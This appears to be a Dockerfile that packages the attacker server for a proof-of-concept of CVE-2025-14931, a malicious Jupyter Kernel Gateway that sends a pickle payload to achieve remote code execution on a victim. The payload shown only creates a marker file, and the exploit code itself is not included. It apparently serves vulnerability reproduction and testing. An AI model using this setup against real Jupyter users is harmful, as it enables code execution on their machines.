# CVE-2025-14931 â€” Malicious Jupyter Kernel Gateway (attacker)
FROM python:3.12-slim-bookworm

LABEL description="Malicious Jupyter Kernel Gateway for CVE-2025-14931 PoC"
LABEL role="attacker"

# Install aiohttp for combined HTTP + WebSocket server
RUN pip install --no-cache-dir aiohttp==3.11.13

WORKDIR /app
COPY malicious_server.py /app/malicious_server.py

EXPOSE 8888

# Default pickle command (creates marker file on the VICTIM)
ENV PICKLE_COMMAND="touch /tmp/pwned && echo RCE_SUCCESS"
ENV HOST="0.0.0.0"
ENV PORT="8888"

HEALTHCHECK --interval=3s --timeout=2s --retries=5 \
    CMD python3 -c "import urllib.request; urllib.request.urlopen('http://localhost:8888/api/kernelspecs')" || exit 1

CMD ["python3", "/app/malicious_server.py"]
